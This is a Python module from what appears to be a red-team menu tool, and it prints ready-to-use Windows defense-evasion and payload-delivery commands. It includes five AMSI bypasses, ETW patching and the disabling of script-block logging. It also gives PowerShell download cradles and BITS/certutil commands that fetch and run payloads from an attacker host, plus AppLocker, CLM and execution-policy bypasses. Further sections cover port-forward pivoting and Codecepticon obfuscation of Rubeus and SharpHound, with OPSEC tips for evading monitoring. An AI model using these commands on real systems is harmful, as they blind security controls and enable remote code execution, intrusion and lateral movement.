"""
Module: AMSI Bypass & Defense Evasion
Techniques: AMSI bypass (5 methods), PowerShell download cradles (6 methods),
            CLM bypass, AppLocker bypass, Execution policy bypass,
            ETW patching, Port forwarding, PS credential objects
"""
from utils.helpers import *
from config.settings import SESSION

AMSI_BYPASSES = {
    "1": {
        "name": "PowerShell Downgrade (v2)",
        "cmd":  'powershell -v 2 -c "<your_command>"',
        "note": "Requires .NET 2.0/3.5 on target"
    },
    "2": {
        "name": "Classic AMSI Patch (obfuscated strings)",
        "cmd":  r"""sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )""",
        "note": "Run in PowerShell"
    },
    "3": {
        "name": "Base64 Encoded Class/Field Names",
        "cmd":  r"""[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)""",
        "note": "Encodes both class name and field name"
    },
    "4": {
        "name": "Variable-Split (avoid signature)",
        "cmd":  r"""$w = 'System.Management.Automation.A'
$c = 'si'
$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)""",
        "note": "Split across variables to avoid AV signature"
    },
    "5": {
        "name": "PowerShell 6+ s_amsiInitFailed",
        "cmd":  r"""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)""",
        "note": "Works on PS 6.x+"
    },
}

def run():
    print_banner("AMSI BYPASS & DEFENSE EVASION")
    attacker = input_or_session("attacker_ip", "Attacker IP")

    print(f"""
  ── AMSI & ETW ───────────────────────────────────────────────────────────────
  [1]  AMSI Bypass Payloads          (5 techniques)
  [2]  ETW Patching                  (blind Event Tracing)

  ── IN-MEMORY PAYLOAD DELIVERY ───────────────────────────────────────────────
  [3]  PowerShell Download Cradles   (6 methods — CRTP)
  [4]  Base64 Encode & Execute       (bypass logging + policy)
  [5]  BITS-based Download           (bitsadmin / Start-BitsTransfer)

  ── ENVIRONMENT BYPASSES ─────────────────────────────────────────────────────
  [6]  Constrained Language Mode     (CLM bypass)
  [7]  Execution Policy Bypass
  [8]  AppLocker Bypass

  ── PIVOTING & ACCESS ────────────────────────────────────────────────────────
  [9]  Port Forwarding               (netsh portproxy)
  [10] Run Domain Commands from non-domain machine
  [11] Create PowerShell Credential Object

  ── TOOL OBFUSCATION ─────────────────────────────────────────────────────────
  [12] Codecepticon                  (.NET/PS/VBA source obfuscation — AD-Advanced)

  [0]  Back
""")
    c = input(f"  {M}Choice{RST}: ").strip()

    # ── [1] AMSI Bypasses ─────────────────────────────────────────────────────
    if c == "1":
        section("AMSI Bypass Payloads — run in PowerShell")
        for k, v in AMSI_BYPASSES.items():
            print(f"\n  {NEON_YEL}[{k}] {v['name']}{RST}")
            print(f"  {DIM}Note: {v['note']}{RST}")
            print(f"  {NEON_GRN}Payload:{RST}")
            for line in v["cmd"].splitlines():
                print(f"    {line}")

    # ── [2] ETW Patching ──────────────────────────────────────────────────────
    elif c == "2":
        section("ETW Patching — blind Event Tracing for Windows")
        print(f"""
  {NEON_CYN}# Patch ETW in current PS session (NtTraceControl → set to 0){RST}
  $s=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null)
  [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($s,0)

  {NEON_CYN}# Patch via reflection — all PS versions{RST}
  $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  $b=$a.GetField('amsiSession','NonPublic,Static')
  $b.SetValue($null,$null)

  {NEON_CYN}# Disable Script Block Logging (registry — needs admin){RST}
  Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0

  {NEON_CYN}# Check if ScriptBlock logging is enabled{RST}
  Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging
""")

    # ── [3] Download Cradles ──────────────────────────────────────────────────
    elif c == "3":
        section("PowerShell Download Cradles — 6 in-memory execution methods (CRTP)")
        info(f"Replace <attacker> with: {NEON_YEL}{attacker}{RST}")
        print(f"""
  {NEON_CYN}[1] Classic WebClient (most common){RST}
  iex (New-Object Net.WebClient).DownloadString('http://{attacker}/payload.ps1')

  {NEON_CYN}[2] PSv3+ shorthand (iwr){RST}
  iex (iwr 'http://{attacker}/payload.ps1' -UseBasicParsing)

  {NEON_CYN}[3] InternetExplorer COM object (bypasses some proxies){RST}
  $ie = New-Object -ComObject InternetExplorer.Application
  $ie.visible = $False
  $ie.navigate('http://{attacker}/payload.ps1')
  Start-Sleep 5
  $response = $ie.Document.body.innerHTML
  $ie.quit()
  iex $response

  {NEON_CYN}[4] Msxml2.XMLHTTP COM object{RST}
  $h = New-Object -ComObject Msxml2.XMLHTTP
  $h.open('GET','http://{attacker}/payload.ps1',$false)
  $h.send()
  iex $h.responseText

  {NEON_CYN}[5] System.NET.WebRequest (.NET class directly){RST}
  $wr = [System.NET.WebRequest]::Create('http://{attacker}/payload.ps1')
  $r  = $wr.GetResponse()
  iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

  {NEON_CYN}[6] XML document request (alternate parser){RST}
  $x = New-Object System.Xml.XmlDocument
  $x.Load('http://{attacker}/payload.xml')
  iex $x.root.payload

  {NEON_YEL}OPSEC tips:{RST}
  {DIM}• Serve over HTTPS to avoid cleartext logging
  • Use a domain-fronted or CDN URL for proxy bypass
  • Combine with AMSI bypass (option 1) before executing payload
  • iwr / Invoke-WebRequest may be logged — COM objects are less monitored{RST}
""")

    # ── [4] Base64 encode & execute ───────────────────────────────────────────
    elif c == "4":
        section("Base64 Encode & Execute — bypass logging and policy")
        cmd = prompt("PowerShell command to encode")
        if cmd:
            import base64
            encoded = base64.b64encode(cmd.encode("utf-16-le")).decode()
            print(f"""
  {NEON_CYN}Original:{RST} {cmd}
  {NEON_CYN}Encoded:{RST}  {NEON_GRN}{encoded}{RST}

  {NEON_CYN}Execute:{RST}
  powershell -nop -w hidden -enc {encoded}
  powershell -nop -exec bypass -w hidden -enc {encoded}
""")
        print(f"""
  {NEON_CYN}Encode from Linux (python3):{RST}
  python3 -c "import base64; cmd='<PS_CMD>'; print(base64.b64encode(cmd.encode('utf-16-le')).decode())"

  {NEON_CYN}Encode from bash:{RST}
  echo -n '<PS_CMD>' | iconv -t UTF-16LE | base64 -w 0
""")

    # ── [5] BITS download ─────────────────────────────────────────────────────
    elif c == "5":
        section("BITS-based Download — Background Intelligent Transfer")
        info("BITS is a Windows service — often whitelisted, can blend in with Windows Update traffic")
        print(f"""
  {NEON_CYN}# bitsadmin (old, but still works){RST}
  bitsadmin /transfer "WindowsUpdate" http://{attacker}/payload.exe C:\\Windows\\Temp\\payload.exe

  {NEON_CYN}# Start-BitsTransfer (PowerShell){RST}
  Start-BitsTransfer -Source 'http://{attacker}/payload.ps1' -Destination C:\\Windows\\Temp\\p.ps1
  iex (Get-Content C:\\Windows\\Temp\\p.ps1 -Raw)

  {NEON_CYN}# BITS + immediate exec{RST}
  Start-BitsTransfer -Source 'http://{attacker}/payload.exe' -Destination "$env:TEMP\\svc.exe"; & "$env:TEMP\\svc.exe"

  {NEON_CYN}# certutil (backup download method — often monitored){RST}
  certutil -urlcache -split -f http://{attacker}/payload.exe C:\\Windows\\Temp\\payload.exe

  {NEON_CYN}# Alternate data stream — hide payload{RST}
  type payload.exe > C:\\Windows\\Tasks\\legit.txt:payload.exe
  wmic process call create "C:\\Windows\\Tasks\\legit.txt:payload.exe"
""")

    # ── [6] CLM bypass ────────────────────────────────────────────────────────
    elif c == "6":
        print(f"""
  {NEON_CYN}Check current language mode:{RST}
  $ExecutionContext.SessionState.LanguageMode

  {NEON_CYN}CLM Bypass Options:{RST}

  1. Upgrade to PowerShell 6/7 (often unrestricted):
     pwsh

  2. BypassCLM.exe (place in AppLocker-allowed path):
     .\\BypassCLM.exe -c "iex (new-object net.webclient).downloadstring('http://{attacker}/evil.ps1')"

  3. Custom PS runspace (.NET — bypasses CLM completely):
     $rs = [runspacefactory]::CreateRunspace()
     $rs.Open()
     $ps = [powershell]::Create()
     $ps.Runspace = $rs
     $ps.AddScript('$ExecutionContext.SessionState.LanguageMode = "FullLanguage"; <CMD>').Invoke()

  4. Check AppLocker policy:
     Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

  5. Common writable + AppLocker-allowed paths:
     C:\\Windows\\Tasks\\
     C:\\Windows\\Temp\\
     C:\\Windows\\tracing\\
""")

    # ── [7] Execution Policy ──────────────────────────────────────────────────
    elif c == "7":
        print(f"""
  {NEON_CYN}Execution Policy Bypasses:{RST}

  # Bypass flag
  powershell -nop -exec bypass

  # Environment variable override
  $env:PSExecutionPolicyPreference = "bypass"

  # Encoded command (no policy check)
  powershell -nop -w hidden -enc <base64>

  # Dot-source from network share
  . \\\\{attacker}\\share\\payload.ps1

  # Force import unsigned module
  Import-Module .\\evil.psm1 -Force

  # Set globally (needs admin)
  Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force
""")

    # ── [8] AppLocker bypass ──────────────────────────────────────────────────
    elif c == "8":
        print(f"""
  {NEON_CYN}AppLocker Bypass Techniques:{RST}

  1. LOLBAS — Microsoft-signed binaries that execute code:
     rundll32.exe javascript:"..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://{attacker}/payload.sct")
     mshta.exe    http://{attacker}/payload.hta
     regsvr32.exe /s /n /u /i:http://{attacker}/payload.sct scrobj.dll
     installutil.exe /logfile= /logtoconsole=false /U payload.exe

  2. DLL rules often NOT enforced — rundll32:
     rundll32.exe .\\evil.dll,EntryPoint

  3. Alternate Data Stream execution:
     type evil.exe > legitfile.txt:evil.exe
     wmic process call create "legitfile.txt:evil.exe"

  4. Writable + allowed paths (common defaults):
     C:\\Windows\\Tasks\\
     C:\\Windows\\Temp\\
     C:\\Windows\\tracing\\
     C:\\Windows\\System32\\spool\\drivers\\color\\
     C:\\Windows\\SysWOW64\\Tasks\\

  5. Check effective policy:
     Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\\Windows\\Temp\\test.exe
""")

    # ── [9] Port forwarding ───────────────────────────────────────────────────
    elif c == "9":
        lport = prompt("Listen port (on pivot machine)")
        rhost = prompt(f"Destination host [{attacker}]") or attacker
        rport = prompt("Destination port")
        print(f"""
  {NEON_CYN}Run on Windows pivot machine (requires admin):{RST}

  # Add port forward
  netsh interface portproxy add v4tov4 listenport={lport} connectaddress={rhost} connectport={rport}

  # Open firewall
  netsh advfirewall firewall add rule name="PF_{lport}" dir=in action=allow protocol=TCP localport={lport}

  # Verify
  netsh interface portproxy show v4tov4

  {DIM}# Remove later:
  netsh interface portproxy delete v4tov4 listenport={lport}
  netsh advfirewall firewall delete rule name="PF_{lport}"{RST}
""")

    # ── [10] Non-domain machine ───────────────────────────────────────────────
    elif c == "10":
        dom  = input_or_session("domain",   "Domain")
        user = input_or_session("username", "Username")
        dc   = input_or_session("dc_ip",    "DC IP")
        print(f"""
  {NEON_CYN}Run domain commands from non-domain joined machine:{RST}

  # Method 1 — runas /netonly
  runas /netonly /user:{dom}\\{user} cmd.exe
  # From the spawned cmd:
  net view \\\\{dom}\\
  .\\SharpHound.exe -d {dom}

  # Method 2 — PowerShell credential object
  $pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential('{dom}\\{user}', $pass)
  Get-ADUser -Filter * -Server {dc} -Credential $cred

  # Method 3 — DNS suffix injection
  Add-DnsClientNrptRule -Namespace ".{dom}" -NameServers "{dc}"
""")

    # ── [11] PS Credential object ─────────────────────────────────────────────
    elif c == "11":
        u = prompt("DOMAIN\\Username (e.g. CORP\\user1)")
        p = prompt("Password")
        print(f"""
  {NEON_CYN}PowerShell Credential Object:{RST}

  $pass = ConvertTo-SecureString '{p}' -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential('{u}', $pass)

  {NEON_CYN}Use with cmdlets:{RST}
  Enter-PSSession  -ComputerName <target> -Credential $cred
  Invoke-Command   -ComputerName <target> -Credential $cred -ScriptBlock {{whoami}}
  New-PSDrive      -Name Z -PSProvider FileSystem -Root \\\\<target>\\C$ -Credential $cred
  Get-WmiObject    -ComputerName <target> -Credential $cred -Class Win32_ComputerSystem
  Get-ADUser       -Filter * -Server <dc> -Credential $cred
""")

    # ── [12] Codecepticon ─────────────────────────────────────────────────────
    elif c == "12":
        tool   = prompt("Tool to obfuscate [Rubeus/SharpHound/Seatbelt/custom]") or "Rubeus"
        src    = prompt(f"Source file path [{tool}.cs / {tool}.csproj]") or f"{tool}.cs"
        outdir = prompt("Output directory [obfuscated/]") or "obfuscated/"
        print(f"""
  {NEON_CYN}Codecepticon — .NET / PowerShell / VBA Source Code Obfuscator:{RST}

  {DIM}Codecepticon renames namespaces, classes, methods, and variables using
  Markov-chain generated names to defeat signature-based detection.
  Works on C# source (.cs) and project files (.csproj).{RST}

  ── Basic obfuscation ({tool}) ───────────────────────────────────────────
  Codecepticon.exe \\
    --action obfuscate \\
    --module csharp \\
    --profile {tool.lower()} \\
    --in {src} \\
    --out {outdir}

  ── Full options (Markov rename — best AV evasion) ────────────────────────
  Codecepticon.exe \\
    --action obfuscate \\
    --module csharp \\
    --profile {tool.lower()} \\
    --in {src} \\
    --out {outdir} \\
    --rename-method markov \\
    --rename-class markov \\
    --rename-namespace markov \\
    --rename-variables markov \\
    --rename-args markov

  ── PowerShell obfuscation ────────────────────────────────────────────────
  Codecepticon.exe \\
    --action obfuscate \\
    --module powershell \\
    --in Invoke-Mimi.ps1 \\
    --out {outdir} \\
    --rename-method markov

  ── Map file (rename tracking) ────────────────────────────────────────────
  # A map file is auto-generated alongside obfuscated output:
  # {outdir}{tool}-map.xml  ← maps original → obfuscated names
  # Use it to de-obfuscate output/errors if needed:
  Codecepticon.exe --action deobfuscate --map {outdir}{tool}-map.xml \\
    --in obfuscated_output.txt

  ── Build the obfuscated binary ───────────────────────────────────────────
  # After obfuscation, compile normally:
  cd {outdir}
  dotnet build -c Release
  # Or via MSBuild:
  msbuild {tool}.csproj /p:Configuration=Release

  {NEON_CYN}Common profiles:{RST}
  {DIM}  --profile rubeus      → Rubeus (Kerberos toolkit)
  --profile sharphound  → SharpHound (BloodHound collector)
  --profile seatbelt    → Seatbelt (host enum)
  --profile sharpup     → SharpUp (privesc)
  --profile custom      → any .cs / .csproj{RST}

  {NEON_CYN}Why Codecepticon over Invoke-Obfuscation:{RST}
  {DIM}• Operates at source level — changes symbol names, not just encoding
  • Defeats YARA/string-based sigs that look for "Rubeus", "SharpHound", etc.
  • Markov naming produces natural-looking code identifiers
  • Works on full .NET projects, not just single-file scripts{RST}

  {NEON_CYN}Tool source:{RST}
  {DIM}github.com/Accenture/Codecepticon{RST}
""")

    pause()
